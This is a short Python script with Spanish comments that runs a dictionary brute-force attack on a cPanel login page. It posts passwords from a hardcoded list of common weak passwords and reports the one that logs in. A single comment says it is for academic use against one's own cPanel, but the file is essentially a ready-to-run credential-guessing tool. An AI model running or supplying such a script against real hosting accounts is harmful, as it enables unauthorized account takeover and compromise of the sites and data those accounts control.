import requests

# URL de inicio de sesión de cPanel
cpanel_url = 'https://tu_dominio_o_ip:2083/login/'

# Datos del formulario de inicio de sesión
def intentar_login(usuario, password):
    payload = {
        'user': usuario,
        'pass': password
    }

    # Enviar la solicitud POST al formulario de login
    with requests.Session() as session:
        response = session.post(cpanel_url, data=payload)

        # Verificar si la respuesta contiene algo que indique éxito o fracaso
        if "Log out" in response.text or "dashboard" in response.url:
            return True
        else:
            return False

# Cargar una lista de contraseñas de ejemplo
def cargar_diccionario():
    return ["password123", "admin", "cpanel", "123456", "root", "letmein"]

# Pedir al usuario el nombre de usuario de cPanel (para fines académicos debe ser tu propio cPanel)
usuario = input("Introduce el nombre de usuario de cPanel: ")

# Probar cada contraseña en el diccionario
for password in cargar_diccionario():
    print(f"Intentando con: {password}")
    if intentar_login(usuario, password):
        print(f"¡Login exitoso con la contraseña: {password}")
        break
    else:
        print("Contraseña incorrecta.")
